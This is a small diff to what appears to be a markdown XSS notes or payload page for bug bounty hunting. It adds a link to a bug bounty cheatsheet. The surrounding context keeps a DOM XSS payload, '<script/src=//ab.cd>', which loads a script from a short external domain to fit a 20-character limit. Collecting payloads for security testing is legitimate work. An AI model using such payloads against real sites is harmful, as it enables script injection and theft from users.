@@ -61,3 +61,5 @@ DOM XSS via $.append(<PAYLOAD>)
 3. 20 char limit(!!): Used my 5 char domain <script/src=//ab.cd> 
 ```
 ***thanks to [@spaceracoon](https://twitter.com/spaceraccoonsec)***
+## Bug bounty cheatsheet
+> ***https://github.com/EdOverflow/bugbounty-cheatsheet***
